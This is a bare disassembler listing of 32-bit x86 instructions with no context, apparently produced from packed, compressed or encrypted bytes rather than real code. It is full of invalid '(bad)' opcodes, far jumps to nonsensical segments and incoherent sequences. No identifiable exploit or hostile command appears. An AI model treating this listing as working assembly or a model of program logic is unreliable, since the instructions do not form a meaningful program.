  414741:	je     0x414743
  414743:	push   cs
  414744:	and    eax,0x5760e947
  414749:	mov    cl,0x20
  41474b:	add    al,BYTE PTR [eax]
  41474d:	scas   eax,DWORD PTR es:[edi]
  41474e:	cmp    eax,DWORD PTR [esi+ebx*1-0x542546db]
  414755:	aas    
  414756:	jbe    0x41471e
  414758:	inc    ebp
  414759:	stos   DWORD PTR es:[edi],eax
  41475a:	aam    0x62
  41475c:	out    dx,eax
  41475d:	enter  0xc23d,0x29
  414761:	jmp    0x4531:0xd93b90dc
  414768:	inc    edi
  414769:	push   ecx
  41476a:	dec    esi
  41476b:	jns    0x414771
  41476d:	lahf   
  41476e:	sub    BYTE PTR [ebx+0x35],dl
  414771:	jge    0x41476d
  414773:	adc    DWORD PTR [esi],esp
  414775:	push   ebx
  414776:	scas   eax,DWORD PTR es:[edi]
  414777:	and    DWORD PTR [esi],0x2a
  41477a:	adc    ch,BYTE PTR [edx]
  41477c:	or     al,0x59
  41477e:	(bad)  
  41477f:	jb     0x4147fe
  414781:	or     ah,BYTE PTR [edx+0x29154514]
  414787:	push   ebp
  414788:	test   DWORD PTR [ecx-0x2b014499],edi
  41478e:	ret    0x5a
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xfe170411
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	andps  xmm2,XMMWORD PTR [edi+0x7f]
  414810:	ror    BYTE PTR [esi-0x7a],0xe5
  414814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414815:	add    DWORD PTR [eax+0x3eb46861],edi
  41481b:	cmp    edi,ecx
  41481d:	nop
  41481e:	jmp    0x8eb3:0x7adc0957
  414825:	or     al,0x42
  414827:	cmp    DWORD PTR [edi-0x2],edi
  41482a:	sbb    BYTE PTR [ebx+0x6be7f652],0xae
  414831:	int3   
  414832:	repnz mov esi,DWORD PTR [esp+edi*4-0x309984c]
  41483a:	mov    dh,0x4b
  41483c:	jp     0x414881
  41483e:	rcl    BYTE PTR [ebx+edi*1],0x29
  414842:	pop    ebp
  414843:	shr    DWORD PTR ds:0x382f6ffa,0xe9
  41484a:	lods   al,BYTE PTR ds:[esi]
  41484b:	and    eax,0xa8c6e8ee
  414850:	push   DWORD PTR [edi+0x11]
  414853:	out    dx,eax
  414854:	cmp    ecx,DWORD PTR [esi+eiz*4]
  414857:	pop    ss
  414858:	dec    edi
  414859:	mov    dl,0x38
  41485b:	fmul   DWORD PTR [edi-0x547821fc]
  414861:	add    DWORD PTR [edi],0x71
  414864:	div    BYTE PTR [edi]
  414866:	lds    edx,FWORD PTR [ebx-0x71921cc9]
  41486c:	(bad)  
  41486d:	or     DWORD PTR ds:0x15d7ec64,ebp
  414873:	sahf   
  414874:	pop    ss
  414875:	pop    eax
  414876:	pop    ebp
  414877:	shr    BYTE PTR [ecx],cl
  414879:	pop    ebx
  41487a:	in     eax,0x63
  41487c:	out    dx,al
  41487d:	mov    dl,BYTE PTR [ebp-0x41af4dea]
  414883:	or     eax,0xf50b711
  414888:	inc    edi
  414889:	xchg   di,ax
  41488b:	pusha  
  41488c:	sahf   
  41488d:	idiv   eax
  41488f:	jge    0x41488f
  414891:	out    dx,eax
  414892:	or     ah,BYTE PTR gs:[ebx]
  414895:	arpl   WORD PTR [esi],di
  414897:	push   ebp
  414898:	rol    DWORD PTR [ecx],cl
  41489a:	ss xor eax,ebx
  41489d:	and    eax,0xf0a915f3
  4148a2:	fistp  DWORD PTR [eax-0x65124b77]
  4148a8:	jno    0x414910
  4148aa:	jmp    0xcc1f8cbb
  4148af:	mov    eax,edx
  4148b1:	div    esp
  4148b3:	mov    esp,0xffb1690b
  4148b8:	fmul   st,st(4)
  4148ba:	in     eax,dx
  4148bb:	retf   0x33f1
  4148be:	xor    bl,BYTE PTR [edi]
  4148c0:	jl     0x4148fc
  4148c2:	stos   DWORD PTR es:[edi],eax
  4148c3:	xchg   ebx,eax
  4148c4:	xchg   ebx,eax
  4148c5:	inc    ecx
  4148c6:	enter  0xa4da,0xd
  4148ca:	xchg   edi,eax
  4148cb:	pop    ecx
  4148cc:	and    al,dl
  4148ce:	(bad)  
  4148d0:	dec    edx
  4148d1:	mov    esp,0xa1c56c5
  4148d6:	jle    0x41489e
  4148d8:	and    DWORD PTR [edi+0x7c],ebp
  4148db:	ja     0x4148fd
  4148dd:	outs   dx,DWORD PTR ds:[esi]
  4148de:	cmp    eax,0x68533e73
  4148e3:	push   ebp
  4148e4:	dec    ecx
  4148e5:	fxam   
  4148e7:	hlt    
  4148e8:	aam    0xe8
  4148ea:	sub    DWORD PTR [esi+0x22e9cbd6],esi
  4148f0:	push   es
  4148f1:	dec    edi
  4148f2:	mov    BYTE PTR [esi-0x3c25c3d6],bl
  4148f8:	int3   
  4148f9:	retf   
  4148fa:	xor    al,0x8c
  4148fc:	fnstcw WORD PTR [eax-0x17]
  4148ff:	dec    eax
  414900:	(bad)  
  414901:	mov    ch,0xa6
  414903:	xchg   esi,eax
  414904:	rcr    bh,cl
  414906:	mov    al,0xf5
  414908:	icebp  
  414909:	cmp    BYTE PTR [edi+eax*8+0x51],0x92
  41490e:	outs   dx,BYTE PTR ds:[esi]
  41490f:	jns    0x414911
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	loopne 0x414906
  414982:	pop    esp
  414983:	jp     0x41497d
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	bnd jle 0x4149ce
  41498f:	bound  esp,QWORD PTR [edi]
  414991:	mov    al,ds:0x436cdaaf
  414996:	lea    edx,[esi-0x35]
  414999:	js     0x414978
  41499b:	repnz rcr BYTE PTR [eax-0x34],0x92
  4149a0:	sbb    BYTE PTR [ebp-0x71],dh
  4149a3:	mov    ss,WORD PTR [ecx+0x6fb9a6bc]
  4149a9:	push   0x8452de27
  4149ae:	and    eax,0x7eab81f6
  4149b3:	int    0x49
  4149b5:	fwait
  4149b6:	ror    dh,0x13
  4149b9:	sbb    al,0xdd
  4149bb:	jne    0x4149c2
  4149bd:	cmp    DWORD PTR [ebp-0x4d6489de],eax
  4149c3:	mov    dl,0x4b
  4149c5:	push   eax
  4149c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c7:	xchg   ecx,eax
  4149c8:	jmp    0x39c5:0x501b1e29
  4149cf:	iret   
  4149d0:	mov    al,0x4a
  4149d2:	mov    ah,0x3d
  4149d4:	pusha  
  4149d5:	adc    eax,DWORD PTR [ecx]
  4149d7:	fld    TBYTE PTR ds:0x12ab3c56
  4149dd:	pop    ds
  4149de:	mov    ds:0x42d251a0,eax
  4149e3:	nop
  4149e4:	mov    ah,0xa3
  4149e6:	xor    eax,0xd9c56d0a
  4149eb:	adc    bh,BYTE PTR [edi-0x24]
  4149ee:	mov    eax,ds:0xe6dd43b7
  4149f3:	mov    ebp,0x89fa3380
  4149f8:	je     0x414a67
  4149fa:	and    DWORD PTR [eax],esp
  4149fc:	in     al,0x1d
  4149fe:	jns    0x414a47
  414a00:	pop    ecx
  414a01:	fcmove st,st(3)
  414a03:	and    eax,0x629fb2f1
  414a08:	mov    ebp,0x7f12a3e1
  414a0d:	iret   
  414a0e:	xor    ebp,DWORD PTR [ebp+0x2a10f4e7]
  414a14:	add    al,0xb2
  414a16:	mov    esp,0x1fb0927e
  414a1b:	fsub   QWORD PTR ds:0xc6b26dab
  414a21:	outs   dx,BYTE PTR ds:[esi]
  414a22:	inc    esi
  414a23:	pop    ebp
  414a24:	ins    DWORD PTR es:[edi],dx
  414a25:	xchg   esi,eax
  414a26:	adc    DWORD PTR [esi+0x57],edx
  414a29:	aaa    
  414a2a:	cmp    eax,0xf8dec833
  414a2f:	or     ecx,ebx
  414a31:	dec    ecx
  414a32:	dec    edx
  414a33:	mov    eax,0xbd35edd3
  414a38:	cwde   
  414a39:	pop    esi
  414a3a:	dec    ecx
  414a3b:	retf   0x2d33
  414a3e:	mov    esi,0x1d24572b
  414a43:	outs   dx,BYTE PTR ds:[esi]
  414a44:	sub    DWORD PTR [edx],edx
  414a46:	inc    esp
  414a47:	jmp    0x1e6c3a20
  414a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a4d:	fisubr WORD PTR [eax-0x7eb31c78]
  414a53:	popf   
  414a54:	in     eax,dx
  414a55:	cmp    al,0xef
  414a57:	mul    DWORD PTR [ebp-0x45]
  414a5a:	jbe    0x414abf
  414a5c:	and    dl,BYTE PTR [ecx]
  414a5e:	stc    
  414a5f:	cmc    
  414a60:	(bad)  
  414a61:	outs   dx,DWORD PTR ds:[esi]
  414a62:	inc    ebx
  414a63:	fbstp  TBYTE PTR [ebp+0x34]
  414a66:	test   DWORD PTR [edx-0x21],ecx
  414a69:	sbb    ah,0xb4
  414a6c:	jg     0x414ae5
  414a6e:	mov    ecx,0x8bbc5e6e
  414a73:	mov    dh,0x58
  414a75:	hlt    
  414a76:	inc    esi
  414a77:	stos   DWORD PTR es:[edi],eax
  414a78:	enter  0x36e1,0x71
  414a7c:	jo     0x414af5
  414a7e:	(bad)  
  414a7f:	push   esp
  414a80:	jl     0x414a9b
  414a82:	jle    0x414a43
  414a84:	shufps xmm6,XMMWORD PTR [esi],0x68
  414a88:	jecxz  0x414a76
  414a8a:	xchg   edi,eax
  414a8b:	sbb    eax,0xb23fa0e0
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x5d7d63d9]
  414b02:	pop    esp
  414b03:	stc    
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	dec    edx
  414b0d:	in     al,dx
  414b0e:	jae    0x414acb
  414b10:	sub    cl,BYTE PTR [esi-0x4ad0b30f]
  414b16:	mov    WORD PTR [ecx-0x2a],ds
  414b19:	xchg   DWORD PTR [edx+0x7c0517b3],edi
  414b1f:	fdiv   QWORD PTR [esi-0x72]
  414b22:	push   eax
  414b23:	xchg   edi,eax
  414b24:	retf   
  414b25:	cmp    al,0xa6
  414b27:	inc    esp
  414b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b29:	imul   ecx,DWORD PTR es:[esp+ebx*8+0x34],0xffffffb3
  414b2f:	sub    ebp,ecx
  414b31:	add    bh,BYTE PTR [eax]
  414b33:	aam    0x89
  414b35:	dec    edi
  414b36:	mov    ebp,0xcf23cdf5
  414b3b:	pcmpeqb mm0,QWORD PTR [esi+0x3788938e]
  414b42:	jmp    0x17aca5a
  414b47:	sub    DWORD PTR [ecx],0xc8ac746a
  414b4d:	inc    eax
  414b4e:	retf   
  414b4f:	mov    dh,0x3
  414b51:	(bad)  
  414b52:	or     cl,BYTE PTR [ebx+0x1c]
  414b55:	jns    0x414ae1
  414b57:	shl    DWORD PTR [ecx],cl
  414b59:	add    DWORD PTR [edx],ebx
  414b5b:	in     eax,dx
  414b5c:	sbb    cl,cl
  414b5e:	push   esp
  414b5f:	or     BYTE PTR es:[esi+0x59],ch
  414b63:	in     eax,dx
  414b64:	pop    edi
  414b65:	sbb    al,0xb6
  414b67:	(bad)  
  414b68:	push   0x998d3966
  414b6d:	mov    ds:0xaf3c3a4d,al
  414b72:	imul   BYTE PTR [esi-0x6]
  414b75:	add    BYTE PTR [ebx+0x40],0x1b
  414b79:	or     eax,0x22c06e5b
  414b7f:	sub    bl,ch
  414b81:	pusha  
  414b82:	push   edx
  414b83:	test   al,0x39
  414b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b86:	aas    
  414b87:	(bad)  
  414b88:	in     eax,dx
  414b89:	das    
  414b8a:	(bad)  
  414b8b:	lods   al,BYTE PTR ds:[esi]
  414b8c:	lds    ebp,FWORD PTR [edi-0x5e]
  414b8f:	pop    eax
  414b90:	xor    ebx,DWORD PTR [ebp+0x7d]
  414b93:	xor    DWORD PTR [ebx-0x7c6340b4],esi
  414b99:	fiadd  WORD PTR [edi+0x25a17a95]
  414b9f:	call   0x9066:0x7d0da6ad
  414ba6:	mov    WORD PTR [edi],ss
  414ba8:	mov    WORD PTR [esi-0x3d909362],es
  414bae:	cli    
  414baf:	cli    
  414bb0:	xchg   edi,eax
  414bb1:	fidiv  WORD PTR [eax+0x38]
  414bb4:	aad    0x1e
  414bb6:	xchg   esi,eax
  414bb7:	cmp    DWORD PTR [eax],ebp
  414bb9:	nop
  414bba:	xor    al,0x4f
  414bbc:	loop   0x414c3c
  414bbe:	ret    0x17f4
  414bc1:	int    0x90
  414bc3:	jmp    0xe1ac:0xa1fa634c
  414bca:	pop    edi
  414bcb:	xor    BYTE PTR [ecx+0x7b63bbc2],bh
  414bd1:	mov    ah,0x86
  414bd3:	mov    cl,0x24
  414bd5:	dec    BYTE PTR [ecx]
  414bd7:	into   
  414bd8:	sub    al,0xe3
  414bda:	(bad)  
  414bdb:	push   edx
  414bdc:	test   al,0x76
  414bde:	(bad)  
  414bdf:	fistp  QWORD PTR [edi+0x7f]
  414be2:	jae    0x414c46
  414be4:	xchg   esp,eax
  414be5:	xchg   ebx,eax
  414be6:	lahf   
  414be7:	push   edx
  414be8:	sti    
  414be9:	nop
  414bea:	bsf    edi,DWORD PTR [eax+eiz*1+0x21]
  414bef:	cmc    
  414bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf1:	imul   esp,DWORD PTR ds:[edi],0xffffff8b
  414bf5:	loope  0x414c48
  414bf7:	push   eax
  414bf8:	sub    BYTE PTR [ebx],ah
  414bfa:	mov    bl,0xde
  414bfc:	mov    eax,ds:0x4c0b9de7
  414c01:	mov    esi,0xb38cc649
  414c06:	ficomp DWORD PTR [ebx+0xfb012a6]
  414c0c:	mov    bl,0xec
  414c0e:	pop    edi
  414c0f:	inc    ebp
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[edi-0x4b]
  414c82:	or     BYTE PTR [ebx],ch
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	gs push ebx
  414c8e:	jge    0x414cf2
  414c90:	out    dx,al
  414c91:	dec    edx
  414c92:	mov    esp,0x783836
  414c97:	enter  0x2ab9,0x25
  414c9b:	lock (bad) 
  414c9d:	mov    ds:0x76ec6b35,al
  414ca2:	fmul   QWORD PTR [eax]
  414ca4:	mov    ebp,0x64a8379d
  414ca9:	or     al,BYTE PTR [edi-0x3e]
  414cac:	mov    ch,0xca
  414cae:	fnstenv [ebx-0x3ad674f4]
  414cb4:	add    ah,BYTE PTR [eax+ebx*2+0x26]
  414cb8:	aad    0x58
  414cba:	cmp    esi,edx
  414cbc:	sti    
  414cbd:	sbb    esp,DWORD PTR [ecx+ebx*8-0x780454bf]
  414cc4:	mov    dl,0xa2
  414cc6:	arpl   WORD PTR ds:0xf8db0af5,sp
  414ccc:	addr16 or al,dl
  414ccf:	mov    ecx,0x37a5c261
  414cd4:	fild   QWORD PTR [esi+0x1dea6ad2]
  414cdb:	les    edi,FWORD PTR [edx+0x7]
  414cde:	cwde   
  414cdf:	pusha  
  414ce0:	test   al,0x61
  414ce2:	sahf   
  414ce3:	scas   eax,DWORD PTR es:[edi]
  414ce4:	sbb    ebx,esp
  414ce6:	clc    
  414ce7:	or     BYTE PTR [ebp+0x73],cl
  414cea:	ss out dx,al
  414cec:	xchg   edi,eax
  414ced:	das    
  414cee:	jmp    0x4389:0x83d589ef
  414cf5:	stos   BYTE PTR es:[edi],al
  414cf6:	inc    ebx
  414cf7:	std    
  414cf8:	mov    bh,0x42
  414cfa:	cs inc edx
  414cfc:	pop    edx
  414cfd:	pop    ebp
  414cfe:	xor    dl,dh
  414d00:	mov    cl,0x38
  414d02:	retf   0x1cf4
  414d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d06:	das    
  414d07:	fwait
  414d08:	mov    cl,0x58
  414d0a:	and    edx,edi
  414d0c:	js     0x414d2a
  414d0e:	add    ecx,edi
  414d10:	jmp    0x414d6f
  414d12:	dec    eax
  414d13:	push   edi
  414d14:	jle    0x414cfd
  414d16:	enter  0xe31d,0x28
  414d1a:	cdq    
  414d1b:	pop    eax
  414d1c:	sub    ah,BYTE PTR [eax-0x6aac623]
  414d22:	icebp  
  414d23:	mov    dh,0xde
  414d25:	mov    ds:0xbbb199e2,eax
  414d2a:	pop    esp
  414d2b:	fst    DWORD PTR [ebx-0x27d1fae4]
  414d31:	dec    edx
  414d32:	fst    QWORD PTR [ecx+0x32]
  414d35:	jge    0x414cfe
  414d37:	adc    ecx,DWORD PTR [edx-0x38]
  414d3a:	mov    esp,0x5b40ebf4
  414d3f:	jo     0x414d0b
  414d41:	cmc    
  414d42:	fs inc ebp
  414d44:	clc    
  414d45:	in     eax,dx
  414d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d47:	test   DWORD PTR [edi+0x2de2f599],esi
  414d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d4e:	jl     0x414cd0
  414d50:	imul   esp,ebx,0xffffffe4
  414d53:	loopne 0x414cdc
  414d55:	mov    DWORD PTR [eax],ecx
  414d57:	or     al,BYTE PTR [ebp+0x2e926ed6]
  414d5d:	test   DWORD PTR [ebp+0x5492ffa3],eax
  414d63:	cmp    edi,DWORD PTR [ebx]
  414d65:	ja     0x414d17
  414d67:	pop    edx
  414d68:	inc    ebp
  414d69:	std    
  414d6a:	push   0xffffff96
  414d6c:	jecxz  0x414db1
  414d6e:	std    
  414d6f:	dec    edx
  414d70:	and    al,0x3e
  414d72:	stos   BYTE PTR es:[edi],al
  414d73:	xchg   DWORD PTR cs:[esi+0x1d],edx
  414d77:	std    
  414d78:	jno    0x414d59
  414d7a:	pop    esp
  414d7b:	arpl   WORD PTR [esi-0x7fb98913],bp
  414d81:	or     DWORD PTR [ebx],edi
  414d83:	jmp    0x209fb993
  414d88:	push   ecx
  414d89:	mov    ebp,0xd42c55d
  414d8e:	retf   
  414d8f:	pop    es
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xe6035c34
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	pop    ebp
  414e0d:	lock jl 0x414de3
  414e10:	mov    ds:0xc124696d,al
  414e15:	jl     0x414df8
  414e17:	enter  0xfa39,0xc4
  414e1b:	xchg   esp,eax
  414e1c:	xor    eax,edx
  414e1e:	sbb    eax,0x8d987b90
  414e23:	repz dec esi
  414e25:	cmp    eax,0xdb1f167d
  414e2a:	add    al,0xb9
  414e2c:	lock cmp esp,DWORD PTR [ebx]
  414e2f:	lods   al,BYTE PTR ds:[esi]
  414e30:	pushf  
  414e31:	sbb    al,0xa5
  414e33:	je     0x414e04
  414e35:	daa    
  414e36:	mov    esp,0x3209317f
  414e3b:	xchg   ebx,eax
  414e3c:	rol    BYTE PTR [ecx+0x73],1
  414e3f:	dec    ecx
  414e40:	sub    ebp,edx
  414e42:	jl     0x414ded
  414e44:	jnp    0x414e14
  414e46:	aaa    
  414e47:	xchg   BYTE PTR [ecx],ah
  414e49:	xchg   edi,eax
  414e4a:	loope  0x414e99
  414e4c:	push   ebp
  414e4d:	shl    BYTE PTR [ebx+0x69],0x1a
  414e51:	push   ebp
  414e52:	out    0xed,al
  414e54:	push   es
  414e55:	jmp    0x414e27
  414e57:	cmp    al,0xf7
  414e59:	lods   al,BYTE PTR ds:[esi]
  414e5a:	fld    TBYTE PTR [edi-0x24]
  414e5d:	adc    ecx,DWORD PTR [ebx]
  414e5f:	fwait
  414e60:	and    BYTE PTR [esi],al
  414e62:	jae    0x414e21
  414e64:	test   BYTE PTR [ecx],ch
  414e66:	dec    ebp
  414e67:	(bad)  
  414e68:	mov    eax,ds:0xaf956442
  414e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e6e:	mov    ds:0x9b5c1fcd,eax
  414e73:	jle    0x414e23
  414e75:	push   ds
  414e76:	xchg   ebx,eax
  414e77:	push   ds
  414e78:	ins    DWORD PTR es:[edi],dx
  414e79:	mov    fs,WORD PTR [ebx+ecx*1-0x17]
  414e7d:	mov    ?,ebp
  414e7f:	das    
  414e80:	sub    eax,0x8ec91e6c
  414e85:	test   dl,dh
  414e87:	mov    esi,0xbc892ce3
  414e8c:	test   eax,0xf616e4b1
  414e91:	xchg   DWORD PTR [edx+0x2070016f],edi
  414e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e98:	lods   al,BYTE PTR ds:[esi]
  414e99:	test   DWORD PTR [edx],ecx
  414e9b:	cmp    al,0xf8
  414e9d:	push   ds
  414e9e:	outs   dx,DWORD PTR ds:[esi]
  414e9f:	test   DWORD PTR [ecx+eiz*2+0x38],ebp
  414ea3:	sbb    ebp,DWORD PTR [ecx]
  414ea5:	daa    
  414ea6:	sbb    DWORD PTR [ebp+0x56af1c0e],eax
  414eac:	rcl    dh,1
  414eae:	imul   edi,DWORD PTR ds:[ebx],0xeee3dec5
  414eb5:	cmp    ebx,DWORD PTR [edi]
  414eb7:	int3   
  414eb8:	inc    BYTE PTR [edx+0x4d]
  414ebb:	dec    ebx
  414ebc:	push   ecx
  414ebd:	dec    edi
  414ebe:	popa   
  414ebf:	jno    0x414e79
  414ec1:	push   edi
  414ec2:	in     eax,dx
  414ec3:	ds addr16 in al,dx
  414ec6:	repz adc BYTE PTR [ebx-0x50],bh
  414eca:	lods   al,BYTE PTR ds:[esi]
  414ecb:	sub    esp,DWORD PTR gs:[ebp-0x27]
  414ecf:	aad    0xc5
  414ed1:	(bad)  
  414ed2:	(bad)  
  414ed3:	or     al,0xd
  414ed5:	mov    ecx,0x5f385516
  414eda:	dec    esi
  414edb:	sub    cl,dl
  414edd:	cwde   
  414ede:	jmp    0xd37f3838
  414ee3:	push   ss
  414ee4:	mov    bl,0x57
  414ee6:	pop    ds
  414ee7:	and    ch,BYTE PTR [edx]
  414ee9:	mov    es,WORD PTR [edx]
  414eeb:	xchg   dx,ax
  414eed:	pusha  
  414eee:	push   ss
  414eef:	inc    ebx
  414ef0:	fnstenv [eax+0x103dc15f]
  414ef6:	aad    0xfb
  414ef8:	sahf   
  414ef9:	ret    
  414efa:	mov    fs,WORD PTR [esi]
  414efc:	and    al,0xda
  414efe:	rcr    BYTE PTR [edi],1
  414f00:	mov    WORD PTR [ebx],gs
  414f02:	ins    BYTE PTR es:[edi],dx
  414f03:	mov    ecx,edi
  414f05:	(bad)  
  414f06:	jmp    0xc1cd3d0d
  414f0b:	and    edx,DWORD PTR [ebx+0x8802a6]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x499312b4
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	mov    ebx,DWORD PTR [esi-0x63388d3d]
  414f92:	ds jg  0x414f56
  414f95:	js     0x414fad
  414f97:	dec    DWORD PTR [esi]
  414f99:	push   edx
  414f9a:	jmp    0x415006
  414f9c:	jns    0x41500e
  414f9e:	cld    
  414f9f:	test   esi,eax
  414fa1:	outs   dx,DWORD PTR ds:[esi]
  414fa2:	adc    eax,0x8f946cbb
  414fa7:	push   cs
  414fa8:	dec    esp
  414fa9:	cwde   
  414faa:	cs xchg ecx,eax
  414fac:	push   ebp
  414fad:	pop    ebx
  414fae:	dec    esp
  414faf:	pop    es
  414fb0:	inc    edx
  414fb1:	repz addr16 ja 0x414fd0
  414fb5:	int    0x27
  414fb7:	cmp    esp,DWORD PTR [eax-0x8]
  414fba:	cmp    ebx,esi
  414fbc:	mov    al,0x8a
  414fbe:	lods   eax,DWORD PTR ds:[esi]
  414fbf:	fild   DWORD PTR [ecx+edx*8-0x54290fb]
  414fc6:	(bad)  
  414fc8:	aad    0xb4
  414fca:	xchg   edx,eax
  414fcb:	(bad)  
  414fcc:	dec    esp
  414fcd:	pop    ss
  414fce:	(bad)  
  414fcf:	retf   0xe8d8
  414fd2:	mov    dh,BYTE PTR [ebp+edx*4+0x6f81a9bf]
  414fd9:	or     eax,edi
  414fdb:	(bad)  
  414fdc:	es aam 0x2
  414fdf:	adc    DWORD PTR [edx-0x22208e6b],esp
  414fe5:	or     edx,DWORD PTR ds:0xc44a253f
  414feb:	jo     0x415060
  414fed:	dec    eax
  414fee:	das    
  414fef:	ret    0x8068
  414ff2:	add    ebp,DWORD PTR [ecx]
  414ff4:	jne    0x41500c
  414ff6:	daa    
  414ff7:	scas   eax,DWORD PTR es:[edi]
  414ff8:	iret   
  414ff9:	daa    
  414ffa:	jns    0x414fee
  414ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ffd:	mov    bl,0xec
  414fff:	aaa    
  415000:	(bad)  
  415001:	sub    al,0xd6
  415003:	adc    DWORD PTR ds:0x878a86ea,esp
  415009:	mov    al,0x43
  41500b:	inc    ebx
  41500c:	fdivr  QWORD PTR fs:[edi*2-0x6777bc21]
  415014:	add    eax,0x5a444538
  415019:	xchg   edi,eax
  41501a:	in     eax,0x1c
  41501c:	(bad)  
  41501d:	cmp    ah,BYTE PTR [ecx+0x66]
  415020:	jb     0x415079
  415022:	into   
  415023:	cmp    BYTE PTR [esi-0x5d],dl
  415026:	push   0xffffffab
  415028:	sar    BYTE PTR [eax+esi*4],0xe6
  41502c:	mov    dl,0x69
  41502e:	int    0x56
  415030:	fisubr DWORD PTR [ebp-0x268494df]
  415036:	arpl   cx,bp
  415038:	icebp  
  415039:	mov    cl,0xea
  41503b:	add    al,0x6d
  41503d:	push   esi
  41503e:	enter  0xfc00,0x65
  415042:	popf   
  415043:	shr    BYTE PTR [edi-0x7b569f9d],1
  415049:	mov    al,cs:0x3d0c5489
  41504f:	cs ja  0x41507d
  415052:	mov    es,WORD PTR [ecx-0x339e237b]
  415058:	lds    edx,FWORD PTR [eax-0x2315df81]
  41505e:	mov    esp,0xb9ecb27c
  415063:	addr16 push esp
  415065:	or     BYTE PTR [ebx+0x7ec14b3e],dh
  41506b:	xor    DWORD PTR [eax],ecx
  41506d:	mov    edi,0xd15e64d8
  415072:	ss je  0x415075
  415075:	and    eax,0x20cb8640
  41507a:	push   0x95a9b3ab
  41507f:	loopne 0x4150f2
  415081:	fsubr  DWORD PTR fs:[esi+0x213637ef]
  415088:	xlat   BYTE PTR ds:[ebx]
  415089:	add    edi,edi
  41508b:	imul   DWORD PTR ss:[ebp+eax*4+0x21]
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xa824fc2d
  415102:	scas   al,BYTE PTR es:[edi]
  415103:	xchg   esp,eax
  415104:	or     al,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	sahf   
  41510d:	mov    cs,WORD PTR [ecx+0xc]
  415110:	out    dx,al
  415111:	shld   DWORD PTR [edi-0x5f],ebp,cl
  415115:	enter  0x71cd,0x58
  415119:	add    ah,BYTE PTR [edi+0x312b02ac]
  41511f:	neg    BYTE PTR [ebx+0x7e]
  415122:	or     ebp,DWORD PTR [esi+0x7ddda647]
  415128:	push   ss
  415129:	pop    edx
  41512a:	jge    0x415109
  41512c:	mov    fs,ebp
  41512e:	xor    eax,0xebfa5255
  415133:	xor    esi,esp
  415135:	(bad)  
  415136:	xlat   BYTE PTR ds:[ebx]
  415137:	xchg   DWORD PTR [edi-0x4e],ecx
  41513a:	adc    dh,BYTE PTR [esi]
  41513c:	mov    al,0x62
  41513e:	fild   DWORD PTR [ecx-0x7099764d]
  415144:	inc    ebx
  415145:	sub    al,0xc2
  415147:	ffree  st(5)
  415149:	mov    ebx,0x9be95104
  41514e:	sbb    al,0xae
  415150:	xchg   BYTE PTR [ebp+0x3dd817e1],dh
  415156:	cdq    
  415157:	sub    BYTE PTR [ecx-0x3],0x60
  41515b:	cdq    
  41515c:	sahf   
  41515d:	sub    al,0xf
  41515f:	pop    ds
  415160:	stos   DWORD PTR es:[edi],eax
  415161:	xchg   DWORD PTR [edx+0x6079d190],edx
  415167:	mov    ds:0xfa131f5a,eax
  41516c:	jl     0x415145
  41516e:	push   esp
  41516f:	mov    dh,0x1f
  415171:	dec    eax
  415172:	jae    0x415163
  415174:	sub    al,0x16
